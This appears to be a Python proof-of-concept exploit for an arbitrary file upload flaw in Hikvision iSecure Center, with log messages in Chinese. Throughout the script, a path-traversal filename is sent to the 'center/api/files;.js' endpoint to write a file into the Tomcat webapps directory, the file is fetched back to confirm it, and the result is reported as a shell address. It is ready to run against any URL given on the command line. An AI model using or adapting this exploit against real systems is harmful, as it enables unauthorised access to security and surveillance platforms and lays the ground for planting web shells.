import sys
import requests
import string
import random
import urllib3
import logging

# Disable insecure request warnings
urllib3.disable_warnings()

# Setup logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define proxy settings
PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  # Proxy for Burp Suite
}

# Define HTTP headers
HEADERS = {
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
    'Accept': '*/*',
    'Content-Type': 'application/x-www-form-urlencoded',
}

# Define constants
TIMEOUT = 15
STATUS_OK = 200
VULN_PATH = "center/api/files;.js"
UPLOAD_DIR = "bin/tomcat/apache-tomcat/webapps/clusterMgr/"
FILE_EXT = ".txt"


def generate_random_string(length=10, chars=string.ascii_uppercase + string.digits):
    """Generate a random string of fixed length."""
    return ''.join(random.choices(chars, k=length))


def run(arg):
    try:
        flag = generate_random_string(9)
        filename = generate_random_string(10)
        vuln_url = f"{arg}{VULN_PATH}"

        # Prepare the file payload
        file_payload = {
            'file': (f'../../../../../{UPLOAD_DIR}{filename}{FILE_EXT}', flag, 'application/octet-stream')
        }

        # Perform the POST request
        r = requests.post(vuln_url, files=file_payload, timeout=TIMEOUT, verify=False, proxies=PROXIES)

        if r.status_code == STATUS_OK and "webapps/clusterMgr" in r.text:
            payload = f"{UPLOAD_DIR}{filename}{FILE_EXT};.js"
            url = f"{arg}{payload}"
            r2 = requests.get(url, timeout=TIMEOUT, verify=False, proxies=PROXIES)

            if r2.status_code == STATUS_OK and flag in r2.text:
                logging.info(f"{arg}: 存在海康威视isecure center 综合安防管理平台存在任意文件上传漏洞\nshell地址：{url}")
            else:
                logging.info(f"{arg}: 不存在漏洞 (无法验证上传的文件)")
        else:
            logging.info(f"{arg}: 不存在漏洞 (首次文件上传失败)")

    except requests.exceptions.RequestException as e:
        logging.error(f"{arg}: 网络请求出错 - {e}")
    except Exception as e:
        logging.error(f"{arg}: 出现错误 - {e}")

    # Example of how to call the function


if __name__ == "__main__":
    # Modify the argument as needed
    if len(sys.argv) > 1:
        run(sys.argv[1])
    else:
        print("Usage: python script.py <target_url>")